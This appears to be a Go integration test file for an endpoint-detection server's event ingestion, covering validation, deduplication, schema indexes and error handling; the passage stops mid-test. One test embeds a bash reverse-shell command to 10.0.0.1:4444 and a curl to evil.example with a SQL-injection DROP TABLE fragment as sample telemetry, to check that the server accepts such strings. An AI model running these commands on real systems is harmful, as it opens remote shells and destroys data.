//go:build integration

// Per-context integration tests for the detection bounded context.
// Exercise the full bootstrap.New -> ApplySchema ->
// Service stack against a real MySQL. Skips when EDR_TEST_DSN isn't
// set, matching the project's other DB-using test files.
//
// Per docs/adr/0004-modular-monolith-bounded-contexts.md.

package tests

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"slices"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/detection/api"
	"github.com/fleetdm/edr/server/detection/bootstrap"
	"github.com/fleetdm/edr/server/detection/internal/intake"
	"github.com/fleetdm/edr/server/detection/internal/pipeline"
	endpointapi "github.com/fleetdm/edr/server/endpoint/api"
	identityapi "github.com/fleetdm/edr/server/identity/api"
	rulesapi "github.com/fleetdm/edr/server/rules/api"
	"github.com/fleetdm/edr/server/testdb/full"
)

// stubUserExists is a closure-typed UserExists fixture. Tests pin the known-user set up front; UpdateAlertStatus consults it for the
// FK-replacement check (the cross-context guard that replaces fk_alerts_updated_by).
func stubUserExists(known ...int64) bootstrap.UserExists {
	set := make(map[int64]struct{}, len(known))
	for _, id := range known {
		set[id] = struct{}{}
	}
	return func(_ context.Context, userID int64) (bool, error) {
		_, ok := set[userID]
		return ok, nil
	}
}

// stubRule is a minimal rules.api.Rule that emits one finding for every "trigger" event in the batch. Used by the engine + processor
// tests that need a deterministic rule signal without dragging in any production rule's allowlist + tuning.
type stubRule struct {
	id         string
	techniques []string
}

func (r *stubRule) ID() string           { return r.id }
func (r *stubRule) Techniques() []string { return r.techniques }
func (r *stubRule) Doc() rulesapi.Documentation {
	return rulesapi.Documentation{
		Title:    "Stub rule",
		Summary:  "test fixture",
		Severity: rulesapi.SeverityHigh,
	}
}

func (r *stubRule) Evaluate(_ context.Context, events []api.Event, _ rulesapi.GraphReader) ([]api.Finding, error) {
	var out []api.Finding
	for _, e := range events {
		if e.EventType != "trigger" {
			continue
		}
		out = append(out, api.Finding{
			HostID:      e.HostID,
			RuleID:      r.id,
			Severity:    rulesapi.SeverityHigh,
			Title:       "Triggered",
			Description: "stub rule fired",
			ProcessID:   1,
			EventIDs:    []string{e.EventID},
		})
	}
	return out, nil
}

// stubProvider satisfies the rules.api.RuleProvider shape Engine.LoadActive
// consumes (inline interface).
type stubProvider struct{ rules []rulesapi.Rule }

func (s stubProvider) ActiveRules() []rulesapi.Rule { return s.rules }

// multiPIDStub emits one finding per "trigger" event, with ProcessID parsed from the event payload's "process_id"
// field. The field name is "process_id" (NOT "pid") on purpose: the value is the DB row id of a processes table
// row (an int64 AUTO_INCREMENT key), NOT an OS PID. An earlier version of this stub read payload.pid which fooled a
// later contributor into passing an OS PID and tripping an fk_alerts_process FK violation on InsertAlert. Renaming
// the field surfaces the right semantic at the call site (TestEngine_OneRuleMultipleFindings passes procA/procB
// returned by mustInsertProcess, which are DB row ids). Used by the multiple-findings-from-one-rule scenario:
// distinct DB process_ids yield distinct alert dedup keys, so the resulting findings persist as distinct alert
// rows. stubRule hardcodes ProcessID=1 so it cannot exercise this case.
type multiPIDStub struct{ id string }

func (r *multiPIDStub) ID() string           { return r.id }
func (r *multiPIDStub) Techniques() []string { return nil }
func (r *multiPIDStub) Doc() rulesapi.Documentation {
	return rulesapi.Documentation{Title: "Multi-pid stub", Summary: "test fixture", Severity: rulesapi.SeverityHigh}
}

func (r *multiPIDStub) Evaluate(_ context.Context, events []api.Event, _ rulesapi.GraphReader) ([]api.Finding, error) {
	var out []api.Finding
	for _, e := range events {
		if e.EventType != "trigger" {
			continue
		}
		var p struct {
			ProcessID int64 `json:"process_id"`
		}
		if err := json.Unmarshal(e.Payload, &p); err != nil || p.ProcessID == 0 {
			continue
		}
		out = append(out, api.Finding{
			HostID:      e.HostID,
			RuleID:      r.id,
			Severity:    rulesapi.SeverityHigh,
			Title:       "Multi-pid trigger",
			Description: "multi-pid stub fired",
			ProcessID:   p.ProcessID,
			EventIDs:    []string{e.EventID},
		})
	}
	return out, nil
}

// fixedPIDStub emits one finding per "trigger" event with a configured ProcessID. Used by
// TestEngine_PersistenceFailureSurfacesError to force the FK violation deterministically: a ProcessID that's nowhere
// near the AUTO_INCREMENT counter triggers fk_alerts_process every time InsertAlert runs, surfacing the persistence-
// failure path the spec scenario describes.
//
// The atomic evalCount field lets tests wait until the engine has actually invoked Evaluate at least once before
// asserting downstream state. Without this signal, an Eventually-on-CountUnprocessed assertion is trivially satisfied
// (events start unprocessed; the assertion fires before the processor even claims the batch), so the test cannot
// actually pin "processor tried and the persistence layer rejected the finding."
type fixedPIDStub struct {
	id        string
	processID int64
	evalCount atomic.Int64
}

func (r *fixedPIDStub) ID() string           { return r.id }
func (r *fixedPIDStub) Techniques() []string { return nil }
func (r *fixedPIDStub) Doc() rulesapi.Documentation {
	return rulesapi.Documentation{Title: "Fixed-PID stub", Summary: "test fixture", Severity: rulesapi.SeverityHigh}
}

func (r *fixedPIDStub) Evaluate(_ context.Context, events []api.Event, _ rulesapi.GraphReader) ([]api.Finding, error) {
	r.evalCount.Add(1)
	var out []api.Finding
	for _, e := range events {
		if e.EventType != "trigger" {
			continue
		}
		out = append(out, api.Finding{
			HostID:      e.HostID,
			RuleID:      r.id,
			Severity:    rulesapi.SeverityHigh,
			Title:       "Triggered",
			Description: "fixed-pid stub fired",
			ProcessID:   r.processID,
			EventIDs:    []string{e.EventID},
		})
	}
	return out, nil
}

// errorStub returns an error from Evaluate. Used by TestEngine_OneRuleErrorsRestContinue to prove the engine's
// per-rule loop isolates failures: the error is logged and the loop continues to the next rule.
type errorStub struct{ id string }

func (r *errorStub) ID() string           { return r.id }
func (r *errorStub) Techniques() []string { return nil }
func (r *errorStub) Doc() rulesapi.Documentation {
	return rulesapi.Documentation{Title: "Erroring stub", Summary: "test fixture", Severity: rulesapi.SeverityHigh}
}

func (r *errorStub) Evaluate(_ context.Context, _ []api.Event, _ rulesapi.GraphReader) ([]api.Finding, error) {
	return nil, fmt.Errorf("errorStub %s: deliberate evaluation failure", r.id)
}

// execFiringStub fires one finding per "exec" event the rule sees. Used by TestEngine_SnapshotExecExcludedFromEvaluation
// to prove the engine filters snapshot exec events BEFORE rule evaluation: if the rule never sees the snapshot=true
// exec, no alert is produced for it.
//
// The ProcessID is taken from the stub's pre-configured processID field, NOT from the event payload's "pid". Reason:
// api.Finding.ProcessID is the alerts table's foreign key to processes.id (the auto-increment DB row id), not the OS PID.
// An earlier draft of this stub read payload.pid (the OS PID) and used it directly, which triggered an
// fk_alerts_process FK violation on InsertAlert; locally the processor's retry loop accidentally drove the AUTO_INCREMENT
// past the OS PID and the FK eventually resolved (~2s), but on a slower CI runner the retry never converged within the
// test's 5s Eventually window. Configuring the stub with the DB id returned by mustInsertProcess sidesteps the entire
// race condition and pins the predicate the spec scenario actually cares about (filter strips snapshot exec before the
// rule sees it).
type execFiringStub struct {
	id        string
	processID int64
}

func (r *execFiringStub) ID() string           { return r.id }
func (r *execFiringStub) Techniques() []string { return nil }
func (r *execFiringStub) Doc() rulesapi.Documentation {
	return rulesapi.Documentation{Title: "Exec-firing stub", Summary: "test fixture", Severity: rulesapi.SeverityHigh}
}

func (r *execFiringStub) Evaluate(_ context.Context, events []api.Event, _ rulesapi.GraphReader) ([]api.Finding, error) {
	var out []api.Finding
	for _, e := range events {
		if e.EventType != "exec" {
			continue
		}
		out = append(out, api.Finding{
			HostID:      e.HostID,
			RuleID:      r.id,
			Severity:    rulesapi.SeverityHigh,
			Title:       "Exec fired",
			Description: "exec-firing stub fired",
			ProcessID:   r.processID,
			EventIDs:    []string{e.EventID},
		})
	}
	return out, nil
}

// recordingMetrics captures every hook invocation so tests can assert
// observability survived the phase-5 wiring rewrite.
type recordingMetrics struct {
	mu                  sync.Mutex
	eventsIngested      int
	heartbeatsDropped   int
	alertsCreated       int
	processesReconciled int64
	rowsDeleted         int64
	processRowsDeleted  int64
}

func (m *recordingMetrics) EventsIngested(_ context.Context, _ string, n int) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.eventsIngested += n
}
func (m *recordingMetrics) EventsHeartbeatDropped(_ context.Context, _ string, n int) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.heartbeatsDropped += n
}
func (m *recordingMetrics) AlertCreated(_ context.Context, _, _ string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.alertsCreated++
}
func (m *recordingMetrics) ProcessesTTLReconciled(_ context.Context, n int64) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.processesReconciled += n
}
func (m *recordingMetrics) RetentionRowsDeleted(_ context.Context, n int64) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.rowsDeleted += n
}
func (m *recordingMetrics) ProcessRetentionRowsDeleted(_ context.Context, n int64) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.processRowsDeleted += n
}

func (m *recordingMetrics) snapshot() (events, alerts int, reconciled, deleted int64) {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.eventsIngested, m.alertsCreated, m.processesReconciled, m.rowsDeleted
}

// allowAllAuthZ is a chokepoint stub: every Allow returns granted. Tests defined here exercise detection's ingest / processor paths,
// which are NOT privileged operator routes; the operator-route allow path is sufficiently covered by the engine's own per-action
// matrix in server/identity/internal/authz/engine_test.go.
type allowAllAuthZ struct{}

func (allowAllAuthZ) Allow(context.Context, identityapi.Action, identityapi.Resource) (identityapi.Decision, error) {
	return identityapi.Decision{Allow: true, Reason: "granted"}, nil
}

// detectionOpts bundles the per-test knobs that diverge from defaults.
type detectionOpts struct {
	mode          bootstrap.Mode
	userExists    bootstrap.UserExists
	processTTL    time.Duration
	retentionDays int
}

// newDetection builds a fresh Detection bootstrap against an isolated
// MySQL test DB. Default Mode is Full; tests override via opts.
//
// In Full mode, launches d.Run(ctx) in a goroutine so the processor +
// processttl + retention loops are live. Cleanup cancels and waits.
func newDetection(t *testing.T, opts detectionOpts) *bootstrap.Detection {
	t.Helper()
	db := full.Open(t)
	deps := bootstrap.Deps{
		DB:                   db,
		Mode:                 opts.mode,
		ProcessInterval:      20 * time.Millisecond, // fast so processor tests don't sleep
		ProcessBatch:         100,
		StaleProcessTTL:      opts.processTTL,
		StaleProcessInterval: 20 * time.Millisecond,
		RetentionDays:        opts.retentionDays,
		RetentionInterval:    20 * time.Millisecond,
		UserExists:           opts.userExists,
		AuthZ:                allowAllAuthZ{},
	}
	d, err := bootstrap.New(deps)
	require.NoError(t, err)
	require.NoError(t, d.ApplySchema(t.Context()))

	if opts.mode == bootstrap.ModeFull {
		runCtx, cancel := context.WithCancel(context.Background())
		done := make(chan struct{})
		go func() {
			_ = d.Run(runCtx)
			close(done)
		}()
		t.Cleanup(func() {
			cancel()
			select {
			case <-done:
			case <-time.After(2 * time.Second):
				t.Log("detection.Run did not return within 2s of cancel")
			}
		})
	}
	return d
}

// withHostID pins host_id on the request context the way the real endpoint.HostToken middleware does. Lets the ingest handler tests
// run without spinning up endpoint bootstrap + a token mint.
func withHostID(next http.Handler, hostID string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ctx := endpointapi.WithHostIDForTest(r.Context(), hostID)
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}

// ---- Ingest tests -----------------------------------------------------------

// spec:server-event-ingestion/authenticated-batch-event-submission/a-valid-agent-posts-a-batch
// spec:server-event-ingestion/decoupled-processing-pipeline/ingestion-accepts-events-while-the-processor-is-busy
//
// One test, two scenarios. The double-marker is honest because the test (a) posts a valid batch via the
// host-token-wrapped IngestHandler, asserts HTTP 200 + the host shows up via the read API with the event count
// the spec requires; (b) runs in detectionOpts{mode: ModeFull} which means the processor goroutine is live
// during the ingest, so the test simultaneously demonstrates that the ingestion path does not block on or
// fail because of downstream processing work. If a future refactor unwires either property, this is the test
// that must be updated.
func TestIngest_PersistsEvents(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
	t.Cleanup(srv.Close)

	body := `[{"event_id":"e1","host_id":"host-a","timestamp_ns":1000,"event_type":"fork","payload":{"child_pid":42,"parent_pid":1}}]`
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(body))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)

	hosts, err := d.Service().ListHosts(ctx)
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	assert.Equal(t, "host-a", hosts[0].HostID)
	assert.Equal(t, int64(1), hosts[0].EventCount)
}

// TestIngest_AttackSignatureTelemetryReachesServer drives an end-to-end POST /api/events whose payloads carry the strings a
// content-inspecting WAF blocks on (a reverse-shell command line and a C2 URL with a SQL-injection fragment). Through the
// default getting-started edge (a plain reverse proxy with no managed ruleset, mirrored here by the bare httptest server in
// front of the real ingest handler) the request reaches the server and is accepted and persisted, not blocked. This is the
// supported-topology guarantee behind docs/quickstart-vm.md: the managed-PaaS 403 the agent hit in production is an edge
// artifact, never the server's behavior.
//
// spec:server-availability/the-default-getting-started-deployment-controls-its-own-edge/agent-telemetry-carrying-attack-signatures-reaches-the-server
func TestIngest_AttackSignatureTelemetryReachesServer(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
	t.Cleanup(srv.Close)

	body := `[` +
		`{"event_id":"e1","host_id":"host-a","timestamp_ns":1000,"event_type":"exec",` +
		`"payload":{"path":"/bin/bash","args":["bash","-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}},` +
		`{"event_id":"e2","host_id":"host-a","timestamp_ns":1001,"event_type":"exec",` +
		`"payload":{"path":"/usr/bin/curl","args":["curl","http://evil.example/c2?q=1' OR '1'='1; DROP TABLE users;--"]}}` +
		`]`
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(body))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode, "attack-signature telemetry must be accepted, never content-blocked")

	hosts, err := d.Service().ListHosts(ctx)
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	assert.Equal(t, int64(2), hosts[0].EventCount, "both attack-signature events must persist")
}

// spec:server-event-ingestion/host-identity-pinning/a-batch-contains-a-foreign-host-id
func TestIngest_HostIDMismatchRejected(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})

	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
	t.Cleanup(srv.Close)

	// Body claims host-b but the host-token middleware pinned host-a.
	body := `[{"event_id":"x","host_id":"host-b","timestamp_ns":1,"event_type":"fork","payload":{}}]`
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, srv.URL, strings.NewReader(body))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusBadRequest, resp.StatusCode)
}

func TestIngest_RequiresHostContext(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})

	// No middleware wraps the handler: the host_id pin is absent.
	srv := httptest.NewServer(d.Service().IngestHandler())
	t.Cleanup(srv.Close)

	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, srv.URL, strings.NewReader("[]"))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusInternalServerError, resp.StatusCode)
}

// spec:server-event-ingestion/required-field-validation/a-batch-contains-an-event-with-a-missing-field
//
// Table-driven across the four required fields. Each subtest omits exactly one (event_id, host_id, event_type,
// timestamp_ns) on an otherwise valid envelope, posts the batch, asserts HTTP 400 with the typed
// `missing_fields_at_<index>` error code identifying the failing field's position, and confirms ListHosts is empty
// so the spec's "no events from that batch are persisted" clause holds. The handler's validation lives at
// server/detection/internal/intake/handler.go's per-event loop; a regression that drops the check on any one field
// would surface here. Pinning the error code (not just the status) also prevents a regression where the handler
// returns 400 with a generic body and contributors silently accept it.
func TestIngest_MissingFieldRejected(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		body string
	}{
		{"missing event_id", `[{"event_id":"","host_id":"host-a","timestamp_ns":1,"event_type":"fork","payload":{}}]`},
		{"missing host_id", `[{"event_id":"e1","host_id":"","timestamp_ns":1,"event_type":"fork","payload":{}}]`},
		{"missing event_type", `[{"event_id":"e1","host_id":"host-a","timestamp_ns":1,"event_type":"","payload":{}}]`},
		{"missing timestamp_ns", `[{"event_id":"e1","host_id":"host-a","timestamp_ns":0,"event_type":"fork","payload":{}}]`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
			ctx := t.Context()
			srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
			t.Cleanup(srv.Close)

			req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(tc.body))
			require.NoError(t, err)
			req.Header.Set("Content-Type", "application/json")
			resp, err := srv.Client().Do(req)
			require.NoError(t, err)
			defer resp.Body.Close()
			assert.Equal(t, http.StatusBadRequest, resp.StatusCode, "missing field must return 400")

			respBody, _ := io.ReadAll(resp.Body)
			var parsed map[string]string
			require.NoError(t, json.Unmarshal(respBody, &parsed))
			// The handler emits `missing_fields_at_<idx>` where idx is the position of the offending event in the
			// batch. Every fixture above has the bad event at index 0, so we pin the exact code rather than just
			// the prefix.
			assert.Equal(t, "missing_fields_at_0", parsed["error"],
				"typed diagnostic identifying the failing event's position")

			hosts, err := d.Service().ListHosts(ctx)
			require.NoError(t, err)
			assert.Empty(t, hosts, "no events persisted when validation fails")
		})
	}
}

// spec:server-event-ingestion/required-field-validation/a-batch-body-is-not-valid-json
//
// The handler runs io.ReadAll on the body then json.Unmarshal into []api.Event. A non-array body (here, a JSON
// object) fails Unmarshal and the handler returns 400 with the typed `invalid_json` error code. The spec's "no
// events persisted" clause is satisfied trivially because we never reach the insert path; the test still asserts
// ListHosts is empty to pin the behaviour against a future refactor that might short-circuit differently. Pinning
// the typed error code (not just the status) prevents a regression where the handler returns a generic 400.
func TestIngest_InvalidJSONRejected(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()
	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
	t.Cleanup(srv.Close)

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(`{"not":"an array"}`))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusBadRequest, resp.StatusCode)

	respBody, _ := io.ReadAll(resp.Body)
	var parsed map[string]string
	require.NoError(t, json.Unmarshal(respBody, &parsed))
	assert.Equal(t, "invalid_json", parsed["error"], "typed diagnostic per the spec")

	hosts, err := d.Service().ListHosts(ctx)
	require.NoError(t, err)
	assert.Empty(t, hosts)
}

// spec:server-event-ingestion/idempotent-submission-by-event-id/an-agent-retries-a-batch-after-a-network-failure
// spec:agent-event-uploader/server-side-deduplication-makes-replay-safe/same-batch-is-delivered-twice
//
// The store's InsertEvents uses INSERT IGNORE so duplicate event_id collisions are dropped silently at the
// events table. This test posts the same single-event batch twice and asserts the second response is still 200
// and that the events table has exactly one row afterwards. The agent-event-uploader marker is the AGENT-side
// view of the same property: the agent can safely retry a batch whose ack was lost in transit because the server
// dedupes by event_id and still returns 2xx, so the agent's MarkUploaded path runs and the batch leaves the queue.
// CountEvents (the events table cardinality) is the authoritative probe; hosts.event_count is a per-batch arrival
// counter that increments on every POST including duplicates by design (see
// server/detection/internal/mysql/perf_test.go:59) and is NOT what the idempotency spec scenario constrains.
func TestIngest_DuplicateEventIDIsIdempotent(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()
	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
	t.Cleanup(srv.Close)

	body := `[{"event_id":"e-dup-1","host_id":"host-a","timestamp_ns":1000,"event_type":"fork","payload":{"child_pid":42,"parent_pid":1}}]`
	post := func() *http.Response {
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(body))
		require.NoError(t, err)
		req.Header.Set("Content-Type", "application/json")
		resp, err := srv.Client().Do(req)
		require.NoError(t, err)
		return resp
	}

	resp1 := post()
	require.Equal(t, http.StatusOK, resp1.StatusCode)
	resp1.Body.Close()

	resp2 := post()
	assert.Equal(t, http.StatusOK, resp2.StatusCode, "retry of an already-persisted batch must succeed")
	resp2.Body.Close()

	count, err := d.Store().CountEvents(ctx)
	require.NoError(t, err)
	assert.Equal(t, int64(1), count, "duplicate event_id must not produce a duplicate row in the events table")
}

// spec:server-event-ingestion/event-storage-drops-redundant-indexes/a-duplicate-event-is-still-rejected-after-the-index-diet
//
// TestEvents_SchemaDiet pins the issue #408 index diet on the live migrated schema: the two redundant secondary indexes are gone
// while every index a query relies on remains. A future migration that re-adds a subsumed index trips this test rather than
// silently regrowing the index footprint. (The surrogate-PK swap that was originally part of #408 was dropped: it regressed the
// multi-replica FOR UPDATE SKIP LOCKED claim into deterministic deadlocks; event_id stays the primary key.)
func TestEvents_SchemaDiet(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	indexNames := map[string]bool{}
	rows, err := d.Store().DB().QueryxContext(ctx,
		"SELECT DISTINCT INDEX_NAME FROM INFORMATION_SCHEMA.STATISTICS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'events'")
	require.NoError(t, err)
	defer rows.Close()
	for rows.Next() {
		var name string
		require.NoError(t, rows.Scan(&name))
		indexNames[name] = true
	}
	require.NoError(t, rows.Err())

	assert.False(t, indexNames["idx_events_host_id"], "idx_events_host_id is subsumed by idx_events_host_type_ingested and must be dropped")
	assert.False(t, indexNames["idx_events_type"], "idx_events_type serves no query and must be dropped")
	// Indexes that queries depend on must survive the diet.
	assert.True(t, indexNames["idx_events_processed"], "idx_events_processed backs the FetchUnprocessed SKIP LOCKED claim")
	assert.True(t, indexNames["idx_events_host_type_pid_ingested"], "idx_events_host_type_pid_ingested backs the network-event correlation query")
	assert.True(t, indexNames["PRIMARY"], "events must keep its primary key")

	// event_id remains the primary key (the surrogate-PK swap was dropped, see the doc comment).
	var pkColumn string
	require.NoError(t, d.Store().DB().GetContext(ctx, &pkColumn,
		"SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.STATISTICS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'events' AND INDEX_NAME = 'PRIMARY' AND SEQ_IN_INDEX = 1"))
	assert.Equal(t, "event_id", pkColumn, "event_id remains the primary key")
}

// spec:server-application-control/application-control-block-event-contract/a-block-event-for-a-now-deleted-rule-is-accepted
//
// TestIngest_ApplicationControlBlockForDeletedRuleIsAccepted pins the spec scenario "a block event for a now-deleted rule is
// accepted": an extension denies an exec against an app-control rule, the rule is deleted server-side before the block event
// reaches the server, and the agent then posts the `application_control_block` event. The ingest channel is event-kind-agnostic
// and performs no rule-existence check, so the event MUST be accepted (HTTP 200) and persisted so the historical decision is not
// lost. The event references a `rule_id` (`app_control:999999`) that corresponds to no live rule, modelling the deleted-rule
// race. The authoritative probe is the events-table cardinality after ingest.
// spec:server-application-control/application-control-block-event-contract/a-block-event-for-an-unknown-rule-is-accepted
func TestIngest_ApplicationControlBlockForDeletedRuleIsAccepted(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	// rule_id app_control:999999 does not correspond to any live rule on this server (the rule was deleted after the
	// extension denied the exec). The payload otherwise carries the full block-event shape the extension emits.
	blockEvent := api.Event{
		EventID:     "acb-deleted-rule-1",
		HostID:      "host-a",
		TimestampNs: 4000,
		EventType:   "application_control_block",
		Payload: json.RawMessage(`{
			"pid": 100,
			"path": "/Applications/Blocked.app/Contents/MacOS/Blocked",
			"rule_id": "app_control:999999",
			"rule_type": "BINARY",
			"identifier": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
			"severity": "high",
			"policy_id": 1,
			"policy_version": 7
		}`),
	}
	// insertEventsViaIngest asserts HTTP 200 on the POST /api/events response, which is the "server accepts" half of the
	// scenario.
	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{blockEvent})

	// The "and persists" half: the block event lands as a row in the events table even though its rule_id resolves to no
	// live rule, so the historical decision survives the rule deletion.
	count, err := d.Store().CountEvents(ctx)
	require.NoError(t, err)
	assert.Equal(t, int64(1), count, "an application_control_block event for a deleted/unknown rule must still persist")
}

// spec:server-event-ingestion/idempotent-submission-by-event-id/a-batch-mixes-new-and-previously-seen-events
//
// First batch persists one event; second batch contains the same event plus a new one. The expected post-state
// in the events table is two rows: the original (untouched) and the new one. This pins the per-row INSERT
// IGNORE behaviour against a regression that would either reject the whole batch on the first duplicate or
// overwrite the original row. See the comment on TestIngest_DuplicateEventIDIsIdempotent for why CountEvents is
// the right probe rather than hosts.event_count.
func TestIngest_MixedNewAndSeen(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()
	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
	t.Cleanup(srv.Close)

	first := `[{"event_id":"e-seen","host_id":"host-a","timestamp_ns":1000,"event_type":"fork","payload":{"child_pid":1,"parent_pid":0}}]`
	mixed := `[` +
		`{"event_id":"e-seen","host_id":"host-a","timestamp_ns":1000,"event_type":"fork","payload":{"child_pid":1,"parent_pid":0}},` +
		`{"event_id":"e-new","host_id":"host-a","timestamp_ns":2000,"event_type":"fork","payload":{"child_pid":2,"parent_pid":1}}` +
		`]`
	post := func(body string) {
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(body))
		require.NoError(t, err)
		req.Header.Set("Content-Type", "application/json")
		resp, err := srv.Client().Do(req)
		require.NoError(t, err)
		require.Equal(t, http.StatusOK, resp.StatusCode)
		resp.Body.Close()
	}

	post(first)
	post(mixed)

	count, err := d.Store().CountEvents(ctx)
	require.NoError(t, err)
	assert.Equal(t, int64(2), count,
		"mixed batch: the previously-seen event is deduped, the new event is appended; events table = 2 rows")
}

// spec:server-event-ingestion/transparent-persistence-failure-reporting/the-database-is-temporarily-unavailable
//
// Closes the per-test MySQL handle out from under the handler, then posts a valid batch. The store's
// InsertEvents path returns the wrapped sql error; the handler maps that to HTTP 500 with `internal` per the
// "MUST NOT acknowledge a batch that was not durably persisted" clause. Each test gets its own testdb so closing
// the pool here does not affect parallel tests.
func TestIngest_DBErrorReturns5xx(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
	t.Cleanup(srv.Close)

	// Close the pool so the next InsertEvents fails with "sql: database is closed". This is the same shape
	// TestStore_InsertEvents_ClosedDBReturnsError uses in the mysql package; here we assert the handler-side
	// 5xx translation, not the store error itself.
	require.NoError(t, d.Store().DB().Close(), "close pool to force the insert error path")

	body := `[{"event_id":"e-db-down","host_id":"host-a","timestamp_ns":1,"event_type":"fork","payload":{}}]`
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, srv.URL, strings.NewReader(body))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.GreaterOrEqual(t, resp.StatusCode, 500, "DB failure must surface as a 5xx so the agent retries")
	assert.Less(t, resp.StatusCode, 600)
}

// spec:server-event-ingestion/body-size-limit/an-oversized-request-body-is-rejected
//
// Two over-cap shapes are exercised so the test pins both enforcement stages of the handler:
//
//   - Content-Length fast-path: send a body whose declared Content-Length exceeds MaxIngestBodyBytes. The handler must
//     reject with 413 BEFORE reading any of the body.
//   - Streaming MaxBytesReader path: send a chunked body that crosses the cap mid-read. The previous io.LimitReader
//     shape silently truncated and surfaced as `invalid_json`; this case is the regression test for that bug.
//
// Pass: 413 + JSON body {"error":"body_too_large"}. No host appears in ListHosts because no events were persisted.
func TestIngest_OversizedBodyRejected(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		chunked bool
	}{
		{"content-length advertises oversize", false},
		{"chunked body crosses cap mid-stream", true},
	}
	// One event with a 12 MB payload field; the array brackets + envelope overhead push the total over the 10 MB cap.
	bigPayload := strings.Repeat("A", 12*1024*1024)
	body := `[{"event_id":"e-big","host_id":"host-a","timestamp_ns":1,"event_type":"fork","payload":{"data":"` +
		bigPayload + `"}}]`

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
			ctx := t.Context()
			srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
			t.Cleanup(srv.Close)

